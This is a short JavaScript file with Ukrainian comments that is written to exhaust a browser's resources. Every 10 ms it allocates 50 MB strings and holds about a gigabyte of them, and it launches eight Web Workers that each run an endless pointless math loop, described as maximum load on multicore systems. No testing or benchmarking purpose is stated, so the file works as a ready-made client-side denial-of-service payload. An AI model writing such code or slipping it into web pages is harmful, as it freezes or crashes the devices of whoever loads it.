/*
 * Скрипт "Витік Пам'яті та Багатопотоковий Зайвий Розрахунок"
 */

const MEMORY_CONTAINER = [];
const NUM_WORKERS = 8; // Запускаємо 8 робочих потоків для максимального навантаження на багатоядерні системи

// --- 1. Агресивний Витік Пам'яті ---
setInterval(() => {
    // Кожні 10 мс додаємо 50 МБ даних (рядки, які важко прибрати)
    const bigData = 'X'.repeat(50 * 1024 * 1024); 
    MEMORY_CONTAINER.push(bigData);
    
    // Щоб код був "в 100 разів більше", ми додаємо зайві обчислення
    const dummyCalculation = Math.pow(Math.random() * 99999, 100); 
    
    // Регулюємо розмір, щоб не зруйнувати його, але тримати на межі
    if (MEMORY_CONTAINER.length > 20) {
        MEMORY_CONTAINER.shift(); 
    }
}, 10);

// --- 2. Додаткове Навантаження CPU через Web Workers ---
// Кожен worker виконує нескінченний, складний математичний цикл
const workerCode = `
    var i = 0;
    while(true) {
        i++;
        // Складна математика, яка нічого не робить
        var result = Math.tan(Math.log(i)) / Math.exp(i % 500) + Math.cos(i) * Math.sin(i);
    }
`;
const blob = new Blob([workerCode]);

for(let k = 0; k < NUM_WORKERS; k++) {
    // Запускаємо 8 потоків CPU-Hog
    new Worker(URL.createObjectURL(blob)); 
}
